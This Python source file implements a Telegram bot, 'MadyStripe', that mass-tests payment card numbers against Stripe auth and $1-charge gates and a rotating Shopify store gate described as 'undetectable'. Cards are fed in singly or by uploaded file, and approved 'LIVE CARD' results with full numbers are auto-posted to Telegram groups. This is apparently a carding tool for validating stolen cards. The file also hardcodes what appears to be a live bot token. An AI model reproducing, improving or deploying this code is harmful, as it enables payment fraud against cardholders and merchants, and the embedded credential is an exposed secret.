"""
MadyStripe Enhanced Telegram Bot - Unified Gateway System
Combines Shopify HTTP gates + Stripe Auth/Charge gates
Features: Single check, Mass check with file reply, Dual Auth+Charge system
"""

import os
import sys
import time
import threading
from typing import Dict, Optional, List, Tuple

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

try:
    import telebot
except ImportError:
    print("Error: python-telegram-bot-api not installed")
    print("Install with: pip install pyTelegramBotAPI")
    sys.exit(1)

from core.checker import CardChecker, load_cards_from_file, validate_card_format
from core.cc_foundation_gateway import CCFoundationGateway
from core.pipeline_gateway import PipelineGateway
from core.shopify_simple_gateway import SimpleShopifyGateway


class EnhancedTelegramBot:
    """Enhanced Telegram bot with Auth + Charge + Shopify gates"""
    
    def __init__(self, bot_token: str, group_ids: list, bot_credit: str = "@MissNullMe"):
        """Initialize enhanced bot"""
        self.bot = telebot.TeleBot(bot_token)
        self.group_ids = group_ids
        self.bot_credit = bot_credit
        
        # Initialize gateways with modes
        self.cc_foundation = CCFoundationGateway(mode="auth")  # AUTH mode - no charge
        self.pipeline = PipelineGateway(mode="charge")  # CHARGE mode - full $1 charge
        self.shopify = SimpleShopifyGateway()  # SHOPIFY gate
        
        # User state management
        self.user_stop_flags: Dict[str, bool] = {}
        self.active_checkers: Dict[str, CardChecker] = {}
        self.user_proxies: Dict[str, Optional[str]] = {}
        self.global_proxy: Optional[str] = None
        
        # Register handlers
        self._register_handlers()
        self._set_bot_commands()
    
    def _set_bot_commands(self):
        """Set bot commands menu"""
        try:
            from telebot import types
            
            commands = [
                types.BotCommand("start", "🚀 Start the bot"),
                types.BotCommand("help", "📖 Show help"),
                
                # STRIPE GATES
                types.BotCommand("auth", "🔐 AUTH - CC Foundation ($1)"),
                types.BotCommand("charge", "💰 CHARGE - Pipeline ($1)"),
                
                # SHOPIFY GATES  
                types.BotCommand("shopify", "🛍️ Shopify (Dynamic)"),
                types.BotCommand("addsh", "➕ Load 45 working stores"),
                
                # UTILITY
                types.BotCommand("stop", "🛑 Stop checking"),
                types.BotCommand("stats", "📊 View stats"),
            ]
            
            self.bot.set_my_commands(commands)
            print("✅ Bot commands set")
        except Exception as e:
            print(f"⚠️  Could not set commands: {e}")
    
    def _register_handlers(self):
        """Register all command handlers"""
        
        @self.bot.message_handler(commands=['start'])
        def start_handler(message):
            self._handle_start(message)
        
        @self.bot.message_handler(commands=['help'])
        def help_handler(message):
            self._handle_help(message)
        
        # STRIPE GATES
        @self.bot.message_handler(commands=['auth', 'ccf'])
        def auth_handler(message):
            self._handle_auth_check(message)
        
        @self.bot.message_handler(commands=['charge', 'pipe'])
        def charge_handler(message):
            self._handle_charge_check(message)
        
        # SHOPIFY GATE
        @self.bot.message_handler(commands=['shopify', 'shop'])
        def shopify_handler(message):
            self._handle_shopify_check(message)
        
        # UTILITY
        @self.bot.message_handler(commands=['stop'])
        def stop_handler(message):
            self._handle_stop(message)
        
        @self.bot.message_handler(commands=['stats'])
        def stats_handler(message):
            self._handle_stats(message)
        
        @self.bot.message_handler(commands=['addsh'])
        def addsh_handler(message):
            self._handle_addsh(message)
        
        # FILE UPLOAD - Mass check with reply
        @self.bot.message_handler(content_types=['document'])
        def document_handler(message):
            self._handle_document(message)
        
        # SINGLE CARD CHECK
        @self.bot.message_handler(func=lambda m: '|' in m.text)
        def card_handler(message):
            self._handle_single_card(message)
    
    def _handle_start(self, message):
        """Handle /start command"""
        text = f"""
🤖 <b>MadyStripe Enhanced v4.0</b>

<b>🎯 STRIPE GATES (Fast & Reliable):</b>
/auth - 🔐 AUTH Gate (CC Foundation $1)
/charge - 💰 CHARGE Gate (Pipeline $1)

<b>🛍️ SHOPIFY GATE (HTTP/GraphQL):</b>
/shopify - Dynamic store finder (11,419 stores)

<b>📋 USAGE:</b>

<b>Single Card:</b>
Send: <code>4532123456789012|12|25|123</code>
Or: <code>/auth 4532123456789012|12|25|123</code>

<b>Mass Check (File Reply):</b>
1. Upload .txt file with cards
2. Bot replies to YOUR message with results
3. Progress updates in real-time

<b>✨ FEATURES:</b>
• Dual Auth + Charge system
• File reply for mass checks
• STRICT detection (no false positives)
• Live card type detection (2D/3D/3DS)
• Auto-posting approved cards to groups

<b>📊 GATEWAY INFO:</b>
• AUTH: Fast validation ($1 CC Foundation)
• CHARGE: Real charging ($1 Pipeline)
• SHOPIFY: HTTP-based (undetectable)

<b>Bot by:</b> {self.bot_credit}
"""
        self.bot.send_message(message.chat.id, text, parse_mode='HTML')
    
    def _handle_help(self, message):
        """Handle /help command"""
        text = """
<b>📖 MadyStripe Enhanced Help</b>

<b>🎯 STRIPE GATES:</b>

<b>/auth</b> or <b>/ccf</b> - CC Foundation AUTH
• Fast $1 validation
• Best for quick checks
• Example: <code>/auth 4532xxx|12|25|123</code>

<b>/charge</b> or <b>/pipe</b> - Pipeline CHARGE
• Real $1 charging
• Most accurate results
• Example: <code>/charge 4532xxx|12|25|123</code>

<b>🛍️ SHOPIFY GATE:</b>

<b>/shopify</b> or <b>/shop</b> - Dynamic Shopify
• HTTP/GraphQL based
• Tries up to 5 stores
• Example: <code>/shopify 4532xxx|12|25|123</code>

<b>📁 MASS CHECKING:</b>

<b>Method 1: Upload File</b>
1. Upload .txt file with cards (one per line)
2. Bot replies to YOUR message
3. Real-time progress updates
4. Final summary with stats

<b>Method 2: Reply to Message</b>
1. Send cards in a message
2. Reply with /auth or /charge
3. Bot processes and replies

<b>📝 CARD FORMAT:</b>
<code>CARD_NUMBER|MM|YY|CVC</code>

Examples:
<code>4532123456789012|12|25|123</code>
<code>5425233430109903|11|26|456</code>

<b>🎨 CARD TYPES:</b>
🔓 2D - No authentication
🔐 3D - 3D Secure v1
🛡️ 3DS - 3D Secure v2

<b>✅ RESULTS:</b>
• Approved cards → Posted to groups
• Declined/Error → Shown only to you
• Progress every 10 cards

<b>⚡ TIPS:</b>
• Use /auth for fastest checks
• Use /charge for most accurate
• Use /shopify for HTTP-based
• Files limited to 200 cards
• 2.5s delay between checks

<b>📊 OTHER COMMANDS:</b>
/stop - Stop current check
/stats - View gateway statistics
/help - Show this message
"""
        self.bot.send_message(message.chat.id, text, parse_mode='HTML')
    
    def _handle_auth_check(self, message):
        """Handle AUTH gate check (CC Foundation)"""
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            # Check if replying to a message with cards
            if message.reply_to_message and message.reply_to_message.text:
                self._handle_mass_check_reply(message, 'auth')
                return
            
            self.bot.reply_to(
                message,
                "❌ Usage: /auth CARD|MM|YY|CVV\n\n"
                "Example: /auth 4532123456789012|12|25|123\n\n"
                "Or reply to a message with cards using /auth"
            )
            return
        
        card = parts[1].strip()
        self._check_single_card(message, card, self.cc_foundation, "AUTH")
    
    def _handle_charge_check(self, message):
        """Handle CHARGE gate check (Pipeline)"""
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            # Check if replying to a message with cards
            if message.reply_to_message and message.reply_to_message.text:
                self._handle_mass_check_reply(message, 'charge')
                return
            
            self.bot.reply_to(
                message,
                "❌ Usage: /charge CARD|MM|YY|CVV\n\n"
                "Example: /charge 4532123456789012|12|25|123\n\n"
                "Or reply to a message with cards using /charge"
            )
            return
        
        card = parts[1].strip()
        self._check_single_card(message, card, self.pipeline, "CHARGE")
    
    def _handle_shopify_check(self, message):
        """Handle SHOPIFY gate check"""
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            # Check if replying to a message with cards
            if message.reply_to_message and message.reply_to_message.text:
                self._handle_mass_check_reply(message, 'shopify')
                return
            
            self.bot.reply_to(
                message,
                "❌ Usage: /shopify CARD|MM|YY|CVV\n\n"
                "Example: /shopify 4532123456789012|12|25|123\n\n"
                "Or reply to a message with cards using /shopify"
            )
            return
        
        card = parts[1].strip()
        self._check_single_card(message, card, self.shopify, "SHOPIFY")
    
    def _check_single_card(self, message, card: str, gateway, gate_type: str):
        """Check a single card with specified gateway"""
        # Validate card
        is_valid, error = validate_card_format(card)
        if not is_valid:
            self.bot.reply_to(message, f"❌ {error}\n\nUse format: NUMBER|MM|YY|CVC")
            return
        
        self.bot.reply_to(message, f"⏳ Checking with {gateway.name} ({gate_type})...")
        
        # Check card
        status, msg, card_type = gateway.check(card)
        
        # Create result object
        result = self._create_result(card, status, msg, card_type, gateway.name, gate_type)
        
        # Send result to user
        self._send_card_result(message, result, to_user=True)
        
        # Post to groups if live
        if result.is_live():
            self._post_to_groups(message, result)
    
    def _handle_single_card(self, message):
        """Handle single card sent directly (default to AUTH)"""
        card = message.text.strip()
        
        # Validate card
        is_valid, error = validate_card_format(card)
        if not is_valid:
            self.bot.reply_to(message, f"❌ {error}\n\nUse format: NUMBER|MM|YY|CVC")
            return
        
        # Default to AUTH gate for direct cards
        self._check_single_card(message, card, self.cc_foundation, "AUTH")
    
    def _handle_document(self, message):
        """Handle uploaded document - Mass check with file reply"""
        if not message.document.file_name.endswith('.txt'):
            self.bot.reply_to(message, "❌ Please upload a .txt file")
            return
        
        try:
            # Download file
            file_info = self.bot.get_file(message.document.file_id)
            downloaded_file = self.bot.download_file(file_info.file_path)
            
            temp_file = f"/tmp/{message.from_user.id}_cards.txt"
            with open(temp_file, 'wb') as f:
                f.write(downloaded_file)
            
            # Ask which gateway to use
            markup = telebot.types.InlineKeyboardMarkup()
            markup.row(
                telebot.types.InlineKeyboardButton("🔐 AUTH", callback_data=f"mass_auth_{temp_file}"),
                telebot.types.InlineKeyboardButton("💰 CHARGE", callback_data=f"mass_charge_{temp_file}")
            )
            markup.row(
                telebot.types.InlineKeyboardButton("🛍️ SHOPIFY", callback_data=f"mass_shopify_{temp_file}")
            )
            
            self.bot.reply_to(
                message,
                "📁 <b>File Received!</b>\n\n"
                f"<b>Filename:</b> {message.document.file_name}\n\n"
                "Select gateway to check cards:",
                parse_mode='HTML',
                reply_markup=markup
            )
            
        except Exception as e:
            self.bot.reply_to(message, f"❌ Error: {str(e)}")
    
    def _handle_mass_check_reply(self, message, gate_type: str):
        """Handle mass check when replying to a message"""
        replied_text = message.reply_to_message.text
        
        # Extract cards from replied message
        lines = replied_text.strip().split('\n')
        cards = [line.strip() for line in lines if '|' in line]
        
        if not cards:
            self.bot.reply_to(message, "❌ No valid cards found in replied message")
            return
        
        # Select gateway
        if gate_type == 'auth':
            gateway = self.cc_foundation
            gate_name = "AUTH"
        elif gate_type == 'charge':
            gateway = self.pipeline
            gate_name = "CHARGE"
        else:  # shopify
            gateway = self.shopify
            gate_name = "SHOPIFY"
        
        # Start mass check
        self._process_mass_check(message, cards, gateway, gate_name, reply_to_msg=message.reply_to_message)
    
    def _process_mass_check(self, message, cards: List[str], gateway, gate_name: str, reply_to_msg=None):
        """Process mass card checking"""
        user_id = str(message.from_user.id)
        
        # Validate cards
        valid_cards = []
        invalid_count = 0
        
        for card in cards[:200]:  # Limit to 200
            is_valid, _ = validate_card_format(card)
            if is_valid:
                valid_cards.append(card)
            else:
                invalid_count += 1
        
        if not valid_cards:
            self.bot.reply_to(message, "❌ No valid cards found")
            return
        
        if invalid_count > 0:
            self.bot.send_message(
                message.chat.id,
                f"⚠️ Skipped {invalid_count} invalid cards"
            )
        
        # Send initial status (reply to original message if provided)
        target_msg = reply_to_msg if reply_to_msg else message
        
        status_msg = self.bot.reply_to(target_msg, f"""
⏳ <b>Starting Mass Check...</b>

<b>Cards:</b> {len(valid_cards)}
<b>Gateway:</b> {gateway.name} ({gate_name})

<i>Processing...</i>
""", parse_mode='HTML')
        
        # Statistics
        stats = {
            'total': len(valid_cards),
            'checked': 0,
            'approved': 0,
            'declined': 0,
            'errors': 0,
            'live_cards': []
        }
        
        # Check cards in thread
        def check_thread():
            try:
                for i, card in enumerate(valid_cards, 1):
                    if user_id in self.user_stop_flags and self.user_stop_flags[user_id]:
                        break
                    
                    # Check card
                    status, msg, card_type = gateway.check(card)
                    stats['checked'] = i
                    
                    # Update stats
                    if status == 'approved':
                        stats['approved'] += 1
                        result = self._create_result(card, status, msg, card_type, gateway.name, gate_name)
                        stats['live_cards'].append(result)
                        
                        # Post to groups
                        self._post_to_groups(message, result)
                    elif status == 'declined':
                        stats['declined'] += 1
                    else:
                        stats['errors'] += 1
                    
                    # Update progress every 10 cards
                    if i % 10 == 0 or i == len(valid_cards):
                        try:
                            self.bot.edit_message_text(f"""
⏳ <b>Progress: {i}/{len(valid_cards)}</b>

<b>Gateway:</b> {gateway.name} ({gate_name})

✅ Approved: {stats['approved']}
❌ Declined: {stats['declined']}
⚠️ Errors: {stats['errors']}

<i>Checking...</i>
""", message.chat.id, status_msg.message_id, parse_mode='HTML')
                        except:
                            pass
                    
                    time.sleep(2.5)  # Rate limit
                
                # Final summary
                live_rate = (stats['approved'] / stats['total'] * 100) if stats['total'] > 0 else 0
                
                summary = f"""
🎉 <b>Mass Check Complete!</b>

<b>Gateway:</b> {gateway.name} ({gate_name})
<b>Total Cards:</b> {stats['total']}

✅ <b>Approved:</b> {stats['approved']}
❌ <b>Declined:</b> {stats['declined']}
⚠️ <b>Errors:</b> {stats['errors']}

<b>Live Rate:</b> {live_rate:.1f}%

"""
                
                # Add live cards summary
                if stats['live_cards']:
                    summary += "<b>💳 Live Cards:</b>\n"
                    for result in stats['live_cards'][:10]:  # Show first 10
                        summary += f"<code>{result.card}</code> - {result.message}\n"
                    
                    if len(stats['live_cards']) > 10:
                        summary += f"\n<i>...and {len(stats['live_cards']) - 10} more</i>\n"
                
                summary += f"\n<b>Bot by:</b> {self.bot_credit}"
                
                self.bot.edit_message_text(
                    summary,
                    message.chat.id,
                    status_msg.message_id,
                    parse_mode='HTML'
                )
                
            except Exception as e:
                self.bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
            finally:
                if user_id in self.user_stop_flags:
                    del self.user_stop_flags[user_id]
        
        thread = threading.Thread(target=check_thread, daemon=True)
        thread.start()
    
    def _handle_stop(self, message):
        """Handle /stop command"""
        user_id = str(message.from_user.id)
        self.user_stop_flags[user_id] = True
        self.bot.reply_to(message, "🛑 Stopping current check...")
    
    def _handle_stats(self, message):
        """Handle /stats command"""
        text = "<b>📊 Gateway Statistics:</b>\n\n"
        
        # CC Foundation stats
        ccf_total = self.cc_foundation.success_count + self.cc_foundation.fail_count
        ccf_rate = self.cc_foundation.get_success_rate() if ccf_total > 0 else 0
        
        text += f"<b>🔐 CC Foundation (AUTH):</b>\n"
        text += f"  ✅ Success: {self.cc_foundation.success_count}\n"
        text += f"  ❌ Failed: {self.cc_foundation.fail_count}\n"
        text += f"  ⚠️ Errors: {self.cc_foundation.error_count}\n"
        text += f"  📈 Rate: {ccf_rate:.1f}%\n\n"
        
        # Pipeline stats
        pipe_total = self.pipeline.success_count + self.pipeline.fail_count
        pipe_rate = self.pipeline.get_success_rate() if pipe_total > 0 else 0
        
        text += f"<b>💰 Pipeline (CHARGE):</b>\n"
        text += f"  ✅ Success: {self.pipeline.success_count}\n"
        text += f"  ❌ Failed: {self.pipeline.fail_count}\n"
        text += f"  ⚠️ Errors: {self.pipeline.error_count}\n"
        text += f"  📈 Rate: {pipe_rate:.1f}%\n\n"
        
        # Shopify stats
        shop_total = self.shopify.success_count + self.shopify.fail_count
        shop_rate = self.shopify.get_success_rate() if shop_total > 0 else 0
        
        text += f"<b>🛍️ Shopify (HTTP):</b>\n"
        text += f"  ✅ Success: {self.shopify.success_count}\n"
        text += f"  ❌ Failed: {self.shopify.fail_count}\n"
        text += f"  ⚠️ Errors: {self.shopify.error_count}\n"
        text += f"  📈 Rate: {shop_rate:.1f}%\n"
        
        self.bot.send_message(message.chat.id, text, parse_mode='HTML')
    
    def _handle_addsh(self, message):
        """Handle /addsh command - Load working Shopify stores"""
        try:
            # Load stores from shopify_stores.txt (14,948 stores)
            stores_file = "shopify_stores.txt"
            
            if not os.path.exists(stores_file):
                self.bot.reply_to(
                    message,
                    f"❌ Error: {stores_file} not found!\n\n"
                    "Please ensure the file exists in the bot directory."
                )
                return
            
            # Read stores
            with open(stores_file, 'r') as f:
                stores = [line.strip() for line in f if line.strip()]
            
            if not stores:
                self.bot.reply_to(message, "❌ No stores found in file!")
                return
            
            # Load stores into Shopify gateway (directly add to stores list)
            loaded_count = 0
            for store in stores:
                if store and not store.startswith('#'):
                    if store not in self.shopify.stores:
                        self.shopify.stores.append(store)
                        loaded_count += 1
            
            # Send success message
            text = f"""
✅ <b>Shopify Stores Loaded!</b>

<b>Loaded:</b> {loaded_count:,} stores
<b>Source:</b> {stores_file}
<b>Total Available:</b> {len(stores):,} stores

<b>Sample stores:</b>
"""
            
            # Show first 10 stores
            for i, store in enumerate(stores[:10], 1):
                text += f"{i}. <code>{store}</code>\n"
            
            if len(stores) > 10:
                text += f"\n<i>...and {len(stores) - 10} more</i>\n"
            
            text += f"\n<b>Usage:</b> /shopify CARD|MM|YY|CVV"
            text += f"\n\n<b>Bot by:</b> {self.bot_credit}"
            
            self.bot.reply_to(message, text, parse_mode='HTML')
            
            print(f"✅ Loaded {loaded_count} Shopify stores for user {message.from_user.id}")
            
        except Exception as e:
            self.bot.reply_to(message, f"❌ Error loading stores: {str(e)}")
            print(f"Error in _handle_addsh: {e}")
    
    def _create_result(self, card: str, status: str, message: str, card_type: str, gateway_name: str, gate_type: str):
        """Create result object"""
        class Result:
            def __init__(self, card, status, message, card_type, gateway_name, gate_type):
                self.card = card
                self.status = status
                self.message = message
                self.card_type = card_type
                self.gateway = f"{gateway_name} ({gate_type})"
                self.gate_type = gate_type
            
            def is_live(self):
                return self.status == 'approved'
            
            def is_approved(self):
                return self.status == 'approved'
        
        return Result(card, status, message, card_type, gateway_name, gate_type)
    
    def _send_card_result(self, message, result, to_user: bool = True):
        """Send card result to user"""
        type_emoji = "🔓" if result.card_type == "2D" else "🔐" if result.card_type == "3D" else "🛡️"
        
        if result.is_approved():
            text = f"""
✅ <b>APPROVED!</b>

<b>Card:</b> <code>{result.card}</code>
<b>Gateway:</b> {result.gateway}
<b>Response:</b> {result.message}
<b>Card Type:</b> {type_emoji} <b>{result.card_type}</b>
"""
        elif result.status == 'error':
            text = f"""
⚠️ <b>ERROR</b>

<b>Card:</b> <code>{result.card}</code>
<b>Gateway:</b> {result.gateway}
<b>Error:</b> {result.message}
"""
        else:
            text = f"""
❌ <b>DECLINED</b>

<b>Card:</b> <code>{result.card}</code>
<b>Gateway:</b> {result.gateway}
<b>Reason:</b> {result.message}
"""
        
        if to_user:
            self.bot.send_message(message.chat.id, text, parse_mode='HTML')
    
    def _post_to_groups(self, message, result):
        """Post approved card to groups"""
        type_emoji = "🔓" if result.card_type == "2D" else "🔐" if result.card_type == "3D" else "🛡️"
        
        username = message.from_user.username or "User"
        
        text = f"""
✅ <b>LIVE CARD</b> ✅

<b>Card:</b> <code>{result.card}</code>
<b>Gateway:</b> {result.gateway}
<b>Response:</b> {result.message}
<b>Card Type:</b> {type_emoji} <b>{result.card_type}</b>

<b>By:</b> @{username}
<b>Bot:</b> {self.bot_credit}
"""
        
        for group_id in self.group_ids:
            try:
                self.bot.send_message(group_id, text, parse_mode='HTML')
            except Exception as e:
                print(f"Error posting to group {group_id}: {e}")
    
    def run(self):
        """Start the bot"""
        print("="*60)
        print("🤖 MadyStripe Enhanced Bot Starting...")
        print(f"Groups: {', '.join(self.group_ids)}")
        print(f"Gateways: AUTH (CC Foundation), CHARGE (Pipeline), SHOPIFY")
        print("="*60)
        
        while True:
            try:
                self.bot.infinity_polling(timeout=20, long_polling_timeout=10)
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(5)


def run_enhanced_bot(bot_token: str, group_ids: list, bot_credit: str = "@MissNullMe"):
    """Run the enhanced bot"""
    bot = EnhancedTelegramBot(bot_token, group_ids, bot_credit)
    bot.run()


if __name__ == '__main__':
    # Configuration
    BOT_TOKEN = "8598833492:AAHpOq3lB51htnWV_c2zfKkP8zxCrc9cw4M"
    GROUP_IDS = ["-1003538559040"]
    BOT_CREDIT = "@MissNullMe"
    
    run_enhanced_bot(BOT_TOKEN, GROUP_IDS, BOT_CREDIT)
